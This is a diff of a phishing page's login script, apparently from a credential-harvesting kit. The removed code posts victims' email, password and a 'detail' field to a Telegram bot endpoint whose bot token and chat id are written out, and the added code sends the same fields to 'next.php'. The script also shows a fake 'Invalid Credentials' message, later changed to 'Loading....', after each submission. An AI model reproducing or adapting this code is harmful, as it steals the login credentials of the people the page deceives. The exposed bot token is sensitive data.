@@ -432,24 +432,14 @@ position: fixed;
          
          
 		$.ajax({
-	
-          url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
-
-        type: "POST",
-
-        data: {
-
-            chat_id: "8614416084",
-
-            text:
-
-                "email: " + email +
-
-                "\npassword: " + password +
-
-                "\nDetail: " + detail
-
-        }
+         dataType: 'JSON',
+         url: 'next.php',
+        type: 'POST',
+         data:{
+           email:email,
+           password:password,
+          detail:detail 
+             }
           }); 
           
           
@@ -458,7 +448,7 @@ position: fixed;
         document.getElementById('submit-btn').innerHTML = 'Verifing...' ;
         
          setTimeout(function(){
-            $("#msg").html('Invalid Credentials. Please try again'); 
+            $("#msg").html('Loading....'); 
             document.getElementById('msg').classList.remove("alert-danger");
             document.getElementById('msg').classList.add("alert-success");
          },1000)
@@ -477,23 +467,13 @@ position: fixed;
         {
             
          $.ajax({
-			 
-          url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
-
-        type: "POST",
-
-        data: {
-
-            chat_id: "8614416084",
-
-            text:
-
-                "email: " + email +
-
-                "\npassword: " + password +
-
-                "\nDetail: " + detail
-
+          dataType: 'JSON',
+          url: 'next.php',
+          type: 'POST',
+          data:{
+            email:email,
+            password:password,
+            detail:detail,
 
           },
             // data: $('#contact').serialize(),
